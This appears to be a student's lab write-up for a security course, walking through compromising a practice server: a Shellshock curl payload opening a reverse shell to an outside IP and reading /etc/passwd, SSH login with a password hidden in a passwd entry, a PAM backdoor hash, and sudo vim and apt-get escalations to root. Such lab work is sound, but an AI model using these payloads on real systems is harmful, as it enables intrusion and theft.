# Assignment 5 writeup
## reverse terminal
Looking around the vulnerable website. We see that the fortune telling cow is a shell script that is executed from cgi-bin. The source itself contains a comment saying that it uses bash 4-1 for reasons. Thus this means that a shell shock attack might yield some results. We try the following:
```bash
curl -v -A "() {:;}; exec sh -i &>/dev/tcp/213.124.179.37/9000"
  http://vulnserv.wggrs.nl:49163/cgi-bin/fortunecow.sh 
```
whilst running the following on my own machine
```bash
nc -n -lvp 9000
```
which gives the following result
```
*   Trying 35.214.135.47:49163...
* TCP_NODELAY set
* Connected to vulnserv.wggrs.nl (35.214.135.47) port 49163 (#0)
> GET /cgi-bin/fortunecow.sh HTTP/1.1
> Host: vulnserv.wggrs.nl:49163
> User-Agent: () { :; }; /bin/bash -c 'nc 213.124.179.37 9000 -e /bin/sh'
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 500 Internal Server Error
< Date: Mon, 21 Dec 2020 15:03:42 GMT
< Server: Apache/2.4.38 (Debian)
< Content-Length: 618
< Connection: close
< Content-Type: text/html; charset=iso-8859-1
< 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
</head><body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error or
misconfiguration and was unable to complete
your request.</p>
<p>Please contact the server administrator at 
 webmaster@localhost to inform them of the time this error occurred,
 and the actions you performed just before this error.</p>
<p>More information about this error may be available
in the server error log.</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at vulnserv.wggrs.nl Port 49163</address>
</body></html>
* Closing connection 0
```
if the shellshock exploit doesnt work, the server should not give a response. The http 500 code is probably because the shell to my ip cannot be opened properly. Thus we try a different command.

```bash
curl -v -A "() { : ; }; /bin/bash -c 'echo -e \"Content-type: text/html\n\";
 echo -e \"<html><body>\`cat /etc/passwd\`</body></html>\"'"
 http://vulnserv.wggrs.nl:49163/cgi-bin/fortunecow.sh
```
which gives the result
```
root:x:0:0:root:/root:/usr/local/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
bob:x:1000:1000:edoc esruoc eht si password ym:/home/bob:/usr/local/bin/bash
alice:x:1001:1001::/home/alice:/usr/local/bin/bash/body></html>
* Connection #0 to host vulnserv.wggrs.nl left intact
```
Here we see something funny with bob. Rearranging some words, we see that his password is the course code.
Thus we try to ssh and when prompted for the password, we fill in "NWI-IBC034", which gives us a access to bob
```bash
ssh bob@vulnserv.wggrs.nl -p <Port running the service>
```
## Getting root acces
Now, we first check to see if we can do a setuid privilege escalation
```bash
bob@vulnhost:~$ find / -perm -u=s -type f 2>/dev/null                                                       
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/bin/su
/bin/mount
/bin/umount

```
This doesnt look promising. Next we  look at all the services running as root
```bash
ps -aux | grep root                                            
root           1  0.0  0.0   3740  2832 ?        Ss   10:20   0:00 /bin/bash /bin/run_services.sh
root          15  0.0  0.1   8520  4452 ?        Ss   10:20   0:00 /usr/sbin/apache2 -k start
root          80  0.0  0.1  15856  6752 ?        S    10:20   0:00 /usr/sbin/sshd -D
root          87  0.0  0.2  16808  8104 ?        Ss   10:22   0:00 sshd: bob [priv]
bob          109  0.0  0.0   3088   892 pts/0    S+   10:23   0:00 grep root
```
Here run_services.sh looks interesting, since it is a shell script, we take a look at the contents of run_services
```bash
bob@vulnhost:~$ cat /bin/run_services.sh                                                                
#!/bin/bash

echo "$FLAG" > /root/flag
chown root:root /root/flag
chmod 0600 /root/flag

ENV="env -u FLAG"

$ENV apache2ctl start

# Initialise backdoor password
password=$(dd if=/dev/urandom of=/dev/stdout bs=30k count=1 | md5sum | cut -f1 -d' ')

sed -i "s/MYPASSWORD/$password/" /etc/pam.d/common-auth

mkdir -p /run/sshd
chmod 0600 /run/sshd
echo "Starting sshd"
$ENV /usr/sbin/sshd -D
```
The most interesting part here the is setting of password.
dd copys a random input from urandom, to stdout, md5sum hashes it
and cut -f1 -d' ' cuts all output after ' ', which in this case is everything after the hash.
sed -i then copies it to /etc/pam.d/common-auth.
Thus we can retrieve the hash from /etc/pam.d/common-auth.
```
#
# /etc/pam.d/common-auth - authentication settings common to all services
#
# This file is included from other service-specific PAM config files,
# and should contain a list of the authentication modules that define
# the central authentication scheme for use on the system
# (e.g., /etc/shadow, LDAP, Kerberos, etc.).  The default is to use the
# traditional Unix authentication mechanisms.
#
# As of pam 1.0.1-6, this file is managed by pam-auth-update by default.
# To take advantage of this, it is recommended that you configure any
# local modules either before or after the default block, and use
# pam-auth-update to manage selection of other modules.  See
# pam-auth-update(8) for details.

# here are the per-package modules (the "Primary" block)
auth	[success=2 default=ignore]	pam_unix.so nullok_secure

# SNEAKY BACKDOOR HACXXX
auth    [success=1 default=ignore]  pam_backdoor.so password=542e1d149582b187bd025582db37156c
# 1337 HACKER WAS HERE

# here's the fallback if no module succeeds
auth	requisite			pam_deny.so

# prime the stack with a positive return value if there isn't one already;
# this avoids us returning an error just because nothing sets a success code
# since the modules above will each just jump around
auth	required			pam_permit.so
# and here are more per-package modules (the "Additional" block)
# end of pam-auth-update config
```
Thus we have the following hash of the password: 542e1d149582b187bd025582db37156c
Reversing this hash probably isnt feasible, thus we try continue on searching for an exploit.

Next we take a look at the sudoers file. we find:
```
cat /etc/sudoers                                                                                                        
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults	env_reset
Defaults	mail_badpass
Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root	ALL=(ALL:ALL) ALL

# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow bob to install programs
alice     ALL=NOPASSWD: /usr/bin/apt-get

# Allow bob to edit alice's files
# sudo -u alice vim $file
bob   ALL=(alice) /usr/bin/nano, /usr/bin/vim
# TODO there was something with NOEXEC but IDK how to combine it with restricting to bob
# Get back to this.

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
```
Here we see a comment on the NOEXEC command. The NOEXEC command means that any spawned programmes may not execute any other programmes, since that is not set in this case, vim and nano may execute programmes.

Thus we run the following to gain a shell as alice:
```bash
sudo -u alice vim -c ':!/bin/sh'
```

We check what alice is allowed to do:
```bash
$ sudo -l -U alice
Matching Defaults entries for alice on vulnhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User alice may run the following commands on vulnhost:
    (root) NOPASSWD: /usr/bin/apt-get
```
Thus Alice can execute apt-get as root without a password using sudo, thus we look for a way to spawn a new shell using apt-get
Looking at GTFObins, we try the exploits listed under sudo
```
$ sudo apt-get changelog apt-get
E: Unable to locate package apt-get
E: No packages found
```
Since that didn't work, we try the another one
```
sudo apt-get update -o APT::update::pre-invoke::=/bin/bash
root@vulnhost:/tmp#
```
And we have root